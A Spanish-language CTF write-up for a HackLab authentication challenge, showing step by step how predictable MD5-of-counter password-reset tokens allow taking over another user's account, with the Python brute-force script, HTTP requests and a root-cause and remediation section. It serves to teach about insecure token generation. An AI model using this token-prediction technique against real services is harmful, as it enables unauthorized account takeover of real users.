# Desafío - Snow Storm (HackLab)

**Plataforma:** HackLab (SoftwareSeguro)  
**Categoría:** Auth  
**Autor:** adonaissh

## Enunciado

Cambiar el nombre del usuario "Juan Pérez" a "Soy un idiota" para obtener el flag.

## Análisis

La aplicación permite recuperar la contraseña mediante un token enviado por email (`/api/forgot/` → genera token → `/recovery/?t=<token>` → `/api/recovery/` para fijar nueva clave). El token tiene forma de hash de 32 caracteres hexadecimales (longitud típica de MD5).

La hipótesis a validar: el token no es aleatorio criptográficamente, sino el hash de un contador secuencial interno (se incrementa en 1 por cada solicitud de recuperación realizada por cualquier usuario del sistema). Si esto es así, conociendo el valor numérico de nuestro propio token podemos predecir el del próximo usuario que solicite una recuperación — incluyendo a Juan Pérez, si lo forzamos nosotros mismos.

## Explotación

### 1. Identificar el email de la víctima

Revisando el feed de publicaciones (`/home/`) se identificó que el autor "Juan Pérez" corresponde al email:

```
juan.perez@hacklab.com
```

### 2. Intentar modificar el perfil directamente (descartado)

Se probó el endpoint de actualización de perfil (`POST /api/user/update/`) intentando inyectar un `id` o `email` distinto al propio en el body, buscando una posible IDOR directa. No tuvo efecto: el backend identifica al usuario exclusivamente por la cookie de sesión (`sessionid`), así que este vector no funcionó.

### 3. Crear una cuenta propia y generar un token de recuperación

Se creó una cuenta de prueba usando un correo temporal (temp-mail.org), registrando el usuario vía `POST /api/register/`:

```json
POST /api/register/
{
  "nombre": "adonai",
  "apellido": "test",
  "email": "<correo temporal 1>",
  "password": "Test123456",
  "pais": "Argentina"
}
```

Luego se solicitó la recuperación de contraseña de esa cuenta:

```json
POST /api/forgot/
{"email": "<correo temporal 1>"}
```

El correo temporal recibió un enlace de recuperación:

```
http://.../recovery?t=333222170ab9edca4785c39f55221fe7
```

### 4. Confirmar que el token es secuencial

Se repitió el proceso con un segundo correo temporal (cuenta #2), obteniendo un segundo token:

```
http://.../recovery?t=414e773d5b7e5c06d564f594bf6384d0
```

Para verificar si ambos tokens corresponden a un contador numérico hasheado con MD5, se corrió el siguiente script de fuerza bruta en Python, probando un rango de números y comparando su hash MD5 contra los dos tokens obtenidos:

```python
import hashlib

targets = {
    "333222170ab9edca4785c39f55221fe7": None,
    "414e773d5b7e5c06d564f594bf6384d0": None,
}

for i in range(0, 100000):
    h = hashlib.md5(str(i).encode()).hexdigest()
    if h in targets:
        targets[h] = i

for hash_val, num in targets.items():
    print(f"{hash_val} -> {num}")
```

Resultado:

```
333222170ab9edca4785c39f55221fe7 -> 1922
414e773d5b7e5c06d564f594bf6384d0 -> 1923
```

Esto confirma la hipótesis: el token es el **hash MD5 de un contador global secuencial**, que se incrementa en 1 con cada solicitud de recuperación de cualquier usuario del sistema (1922 → 1923 entre nuestras dos solicitudes consecutivas).

### 5. Forzar y predecir el token de Juan Pérez

Con el contador en 1923 tras nuestra última solicitud, se solicitó inmediatamente la recuperación de clave para la cuenta de la víctima:

```json
POST /api/forgot/
{"email": "juan.perez@hacklab.com"}
```

Esto generó el token **1924** en el servidor (enviado a un correo que no controlamos, pero cuyo valor numérico es predecible por ser el siguiente en la secuencia). Se calculó su hash MD5 localmente:

```python
import hashlib
print(hashlib.md5("1924".encode()).hexdigest())
# -> b139e104214a08ae3f2ebcce149cdf6e
```

### 6. Usar el token predicho para fijar una nueva contraseña

Se envió el token calculado junto con una nueva contraseña al endpoint de recuperación:

```json
POST /api/recovery/
{
  "token": "b139e104214a08ae3f2ebcce149cdf6e",
  "password": "hola123456789"
}
```

Respuesta del servidor:

```json
{"message": "Clave modificada exitosamente."}
```

### 7. Iniciar sesión como Juan Pérez

```json
POST /api/login/
{
  "username": "juan.perez@hacklab.com",
  "password": "hola123456789"
}
```

Login exitoso.

### 8. Cambiar el nombre según lo pedido en el enunciado

Desde la sesión de Juan Pérez, se envió la actualización de perfil:

```json
POST /api/user/update/
{
  "nombre": "Soy un idiota",
  "apellido": "Pérez",
  "pais": "Argentina"
}
```

El feed reflejó el cambio en todas las publicaciones y comentarios del usuario, mostrando el mensaje de éxito:

> ¡Felicitaciones! El código ganador es: **17968af07cf621117b36cfbc35b51361**

## Flag

```
17968af07cf621117b36cfbc35b51361
```

## Causa raíz

Los tokens de recuperación de contraseña se generan a partir de un **contador secuencial predecible** (hasheado con MD5, sin sal ni componente aleatorio), en lugar de un valor aleatorio criptográficamente seguro (p. ej. `secrets.token_hex`). Esto permite a un atacante:

1. Generar sus propios tokens para conocer el valor del contador en un momento dado.
2. Forzar la generación del token de la víctima (solicitando la recuperación en su nombre).
3. Predecir ese token sin necesidad de interceptar el correo de la víctima.

## Recomendación

- Generar los tokens de recuperación con un generador aleatorio criptográficamente seguro (ej. `secrets.token_urlsafe(32)`), nunca derivados de un contador o timestamp predecible.
- Invalidar el token tras su primer uso y aplicar una expiración corta.
- No basar la unicidad/impredecibilidad del token únicamente en el hash de un valor de baja entropía (un contador de pocos miles de valores es trivialmente crackeable por fuerza bruta).
